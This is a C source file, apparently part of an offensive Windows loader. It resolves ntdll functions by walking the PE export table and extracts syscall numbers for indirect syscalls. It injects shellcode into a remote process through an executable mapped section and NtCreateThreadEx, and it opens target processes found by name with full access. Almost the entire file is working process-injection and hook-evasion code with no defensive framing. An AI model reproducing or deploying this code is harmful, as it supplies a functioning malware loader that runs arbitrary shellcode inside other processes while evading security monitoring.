#include "Box.h"

#pragma comment (lib, "OneCore.lib")


FARPROC HiddenProcAddress
(
	IN HMODULE hModule,
	IN LPCSTR ApiName
)


{
	static BOOL printedInfo = FALSE;


	// https://github.com/xalicex/Get-DLL-and-Function-Addresses/blob/main/GetModGetProc.c

	/* pBase --> Represents the base address as we will being using it to get the RVA */

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		WARN("Could not Successfully Create a Variable to the Image Dos Header Magic Letters (MZ)");
		return NULL;
	}


	/* pImgDos->e_lfanew ---> Points to the start of a new Executable */
	PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
	{
		WARN("Could not Successfully point to the NT Headers!");
		return NULL;
	}


	/* Optional Header is stored inside the NT headers, and is exactly the same as the older, COFF headers */
	IMAGE_OPTIONAL_HEADER pImgOpt = pImgNt->OptionalHeader;

	PIMAGE_EXPORT_DIRECTORY pImgExport = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)pBase + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD Address = (PDWORD)((LPBYTE)pBase + pImgExport->AddressOfFunctions);

	//Get the function names array 
	PDWORD Name = (PDWORD)((LPBYTE)pBase + pImgExport->AddressOfNames);

	//get the Ordinal array
	PWORD Ordinal = (PWORD)((LPBYTE)pBase + pImgExport->AddressOfNameOrdinals);


	if (!printedInfo)
	{
		printf("\n==============================[PE INFORMATION]==============================\n");
		printf("IMAGE_DOS_HEADER:            [%lu]\n", pImgDos->e_magic);
		printf("IMAGE_NT_HEADER:             [%lu]\n", pImgNt->Signature);
		printf("IMAGE_EXPORT_DIRECTORY:      [0x%p]\n", pImgExport);
		printf("Address Of Names:            [0x%p]\n", Name);
		printf("Address Of Functions:        [0x%p]\n", Address);
		printf("Address Of Name Ordinals:    [0x%p]\n\n", Ordinal);

		printedInfo = TRUE;
	}


	//INFO("Trying to get the Address of %s", ApiName);

	for (DWORD i = 0; i < pImgExport->NumberOfFunctions; i++)
	{

		CHAR* pFuncName = (CHAR*)(pBase + Name[i]);

		PVOID pFuncAddress = (PVOID)(pBase + Address[Ordinal[i]]);

		if (strcmp(ApiName, pFuncName) == 0)
		{
			//OKAY("FOUND API: -\t NAME: %s -\t ADDRESS: 0x%p -\t ORDINAL: %d\n", pFuncName, pFuncAddress, Ordinal[i]);
			return pFuncAddress;
		}

	}


	return NULL;

}



VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys)
{

	DWORD SyscallNumber = 0;

	UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };

	UINT_PTR NtFunctionAddress = 0;

	NtFunctionAddress = (UINT_PTR)HiddenProcAddress(mod, FuncName);
	if (NtFunctionAddress == 0)
	{
		WARN("GetProcAddress Failed! With an Error: %ld", GetLastError());
		return;
	}

	BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];
	BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];
	*FuncSSN = (byte5 << 8) | byte4;

	*FuncSys = NtFunctionAddress + 0x12;


	if (memcmp(SyscallOpcodes, (PVOID)*FuncSys, sizeof(SyscallOpcodes)) == 0) {
		INFO("[0x%p] [0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, (PVOID)*FuncSys, *FuncSSN, FuncName);
		return;
	}

	else {
		WARN("expected syscall signature: \"0x0f05\" didn't match.");
		return;
	}


	/*

		courtesy of Crr0ww for this function :)

	*/


}


BOOL RemoteMapInject
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PBYTE sShellcode,
	IN SIZE_T sShellSize,
	OUT PVOID* pAddress
)

{

	BOOL State = TRUE;
	HANDLE hFile = NULL, hSection = NULL;
	PVOID MLocalAddress = NULL, MRemoteAddress = NULL;
	SIZE_T size = sShellSize;
	PLARGE_INTEGER maxSize = { size };
	HMODULE ntdll = NULL;
	NTSTATUS STATUS = NULL;
	PVOID localaddress = NULL, remoteaddress = NULL;


	ntdll = GetModuleHandleW(L"ntdll.dll");
	if (ntdll == NULL)
	{
		WARN("Could not retrive NTDLL! Reason: %lu", GetLastError);
		return FALSE;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);


	IndirectPrelude(ntdll, "NtCreateSection", &fn_NtCreateSectionSSN, &fn_NtCreateSectionSyscall);
	IndirectPrelude(ntdll, "NtMapViewOfSection", &fn_NtMapViewOfSectionSSN, &fn_NtMapViewOfSectionSyscall);
	IndirectPrelude(ntdll, "NtCreateThreadEx", &fn_NtCreateThreadExSSN, &fn_NtCreateThreadExSyscall);


	STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Create a Section via Indirect Syscalls! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtCreateSection Handle", hSection);
	INFO("NtCreateSection Created with a size of %lld--Bytes", sShellSize);


	STATUS = NtMapViewOfSection(hSection, NtCurrentProcess(), &localaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Map the Section! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtMapViewOfSection Base Address Created!", localaddress);
	INFO("Current Protection--[RWX]  Current Size Allocated--[%zu--Bytes]", sShellSize);

	STATUS = NtMapViewOfSection(hSection, hProcess, &remoteaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Map the Section! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtMapViewOfSection Base Address Created For a Remote Process!", remoteaddress);

	memcpy(localaddress, sShellcode, sShellSize);

	OKAY("Copied %zu Bytes into Local Section Address!", sShellSize);

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteaddress, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtCreateThreadEx Failed to Create a New Thread! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Successfully Created a Thread!", hThread);


CLEANUP:

	if (hFile)
		CloseHandle(hFile);
	return State;

}


BOOL GetRemoteProcessHandle
(
	IN LPCWSTR szProcName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess
)

{

	ULONG							uReturnLen1 = NULL, uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;
	HMODULE							ntdll = NULL;
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);

	ntdll = GetModuleHandleW(L"ntdll.dll");
	if (ntdll == NULL)
	{
		WARN("Could not retrive NTDLL! Reason: %lu", GetLastError);
		return FALSE;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	IndirectPrelude(ntdll, "NtQuerySystemInformation", &fn_NtQuerySystemInformationSSN, &fn_NtQuerySystemInformationSyscall);
	IndirectPrelude(ntdll, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall);



	NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL)
	{
		WARN("HeapAlloc Failed! Reason: %lu", GetLastError());
		return FALSE;
	}

	OKAY("Successfully Allocated Heap into the System Process Information!");

	pValueToFree = SystemProcInfo;


	STATUS = NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtQuerySystemInformation Failed! Reason: 0x%0.8x", STATUS);
		return FALSE;
	}


	while (TRUE)
	{
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0)
		{

			ULONG_PTR foundPid = (ULONG_PTR)SystemProcInfo->UniqueProcessId;
			*PID = (DWORD)foundPid;

			CLIENT_ID CID;
			CID.UniqueProcess = (HANDLE)foundPid;
			CID.UniqueThread = NULL;

			STATUS = NtOpenProcess(hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
			if (STATUS != STATUS_SUCCESS)
			{
				WARN("NtOpenProcess Failed! Reason: 0x%0.8x", STATUS);
				return FALSE;
			}
			break;

		}

		if (!SystemProcInfo->NextEntryOffset)
		{
			break;
		}


		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	}



	if (pValueToFree)
		HeapFree(GetProcessHeap(), 0, pValueToFree);

	// check numeric PID and handle
	if (*PID == 0 || *hProcess == NULL)
		return FALSE;

	return TRUE;
}